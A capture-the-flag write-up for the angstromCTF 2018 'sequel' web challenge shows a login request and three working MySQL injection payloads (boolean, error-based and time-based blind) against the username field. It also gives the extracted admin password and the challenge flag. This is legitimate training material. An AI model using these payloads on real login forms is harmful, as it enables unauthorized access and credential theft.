### Solved by rasta_mouse

```
I found what looks like a Star Wars sequel fan club, but I believe the admin user is up to something more nefarious. Can you log in with the admin account and check it out?
```

Another login page.

![](/images/2018/angstromctf/web/sequel.png)

This form is vulnerable to SQLi.

```
POST / HTTP/1.1
Host: web2.angstromctf.com:2345
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web2.angstromctf.com:2345/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=test&password=test
```

```
Parameter: username (POST)
	Type: boolean-based blind
	Title: OR boolean-based blind - WHERE or HAVING clause
	Payload: username=-7273' OR 8629=8629-- rAqT&password=test

	Type: error-based
	Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
	Payload: username=test' OR (SELECT 6502 FROM(SELECT COUNT(*),CONCAT(0x7162627171,(SELECT (ELT(6502=6502,1))),0x717a716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- cIGu&password=test

	Type: AND/OR time-based blind
	Title: MySQL >= 5.0.12 OR time-based blind
	Payload: username=test' OR SLEEP(5)-- wtln&password=test
```

We can use this to extract the admin credentials: `admin:idontlikesandbutisuredoliketheprequels`.

Then login to get the flag.

`actf{sql_injection_more_like_prequel_injection}`